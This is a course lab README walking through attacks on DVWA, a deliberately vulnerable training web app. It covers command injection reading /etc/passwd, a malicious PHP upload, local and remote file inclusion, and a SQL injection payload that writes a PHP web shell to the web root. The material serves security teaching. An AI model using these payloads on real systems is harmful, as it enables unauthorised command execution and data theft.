# Injections

## Prerequisites

- DVWA setup and accessible
- Login as `admin:password`
- From the side navbar, navigate to `DVWA Security` and set security level to `low`

## Command Injection

- From the website, navigate to `Command Injection`.
- In the IP address textfield, type `127.0.0.1 ; cat /etc/passwd`.
- Click the submit button.
- You should see the following

<img src="https://github.com/AndreaPallotta/CSEC_472_Group_2/blob/main/lab_3/screenshots/command_injection.PNG" alt="command_injection_screenshot" />

## Malicious File Upload

- From the website, navigate to `File Upload`.
- Click the `Browse` button.
- Select [file_upload.php](utils/file_upload.php).
- Click the upload button and way for the success message.
- Navigate to `{IP}/hackable/uploads/file_upload.php`.
- If the php script is successfully executed, you should something similar to the following:

<img src="https://github.com/AndreaPallotta/CSEC_472_Group_2/blob/main/lab_3/screenshots/file_upload.PNG" alt="file_upload_screenshot" />

## Local File Inclusion

- From the website, navigate to `File Inclusion`.
- Notice how the end of the URL contains the following parameter: `page=include.php`.
- Replace `include.php` with `../../../../../../proc/version`
- You should see the following:

<img src="https://github.com/AndreaPallotta/CSEC_472_Group_2/blob/main/lab_3/screenshots/local_file_inclusion.PNG" alt="local_file_inclusion_screenshot" />

## Remote File Inclusion

- From the website, navigate to `File Inclusion`.
- Notice how the end of the URL contains the following parameter: `page=include.php`.
- Replace `include.php` with `https://google.com`
- You should see the following:

<img src="https://github.com/AndreaPallotta/CSEC_472_Group_2/blob/main/lab_3/screenshots/remote_file_inclusion.PNG" alt="remote_file_inclusion_screenshot" />

## SQL Injection + backdoor

- POSSIBLE PAYLOAD: `' UNION SELECT "<? system($_REQUEST['cmd']); ?>",2,3,4 INTO OUTFILE "/var/www/html/temp/c.php"#`\

I am getting the following error, but it might be caused by the way I set up the webapp:  `Acceess denied for user 'dvwa'@'localhost' (using password: YES)`
